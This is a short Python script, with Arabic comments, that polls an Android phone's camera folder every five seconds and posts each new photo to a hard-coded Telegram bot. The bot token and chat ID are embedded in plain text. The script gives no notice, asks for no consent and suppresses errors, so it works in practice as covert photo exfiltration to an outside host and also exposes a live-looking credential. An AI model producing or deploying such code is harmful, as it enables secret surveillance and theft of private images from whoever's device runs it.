import os
import time
import glob
import requests

# ============== الإعدادات ==============
BOT_TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
CHAT_ID = "-1003535367279"
CAMERA_PATH = "/storage/emulated/0/DCIM/Camera"
# ======================================

# علم للتحكم في التشغيل والإيقاف
is_running = False


def send_file_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        filename = os.path.basename(file_path)
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {
                'chat_id': CHAT_ID,
                'caption': f"📄 ملف عالي الجودة:\n{filename}"
            }
            requests.post(url, files=files, data=data, timeout=60)
            return True
    except:
        return False


def run_monitoring():
    global is_running
    last_checked_time = time.time()

    # لن تتوقف الحلقة إلا إذا أصبح is_running = False
    while is_running:
        try:
            if os.path.exists(CAMERA_PATH):
                files = []
                for ext in ('*.jpg', '*.jpeg', '*.png'):
                    files.extend(glob.glob(os.path.join(CAMERA_PATH, ext)))

                files.sort(key=os.path.getmtime)

                for photo in files:
                    if not is_running: break  # خروج فوري إذا تم الإطفاء

                    mod_time = os.path.getmtime(photo)
                    if mod_time > last_checked_time:
                        if send_file_to_telegram(photo):
                            last_checked_time = mod_time
                        time.sleep(1)

        except Exception:
            pass

        time.sleep(5)  # فحص كل 5 ثوانٍ

    print("Monitoring Stopped Manually.")


if __name__ == '__main__':
    is_running = True
    run_monitoring()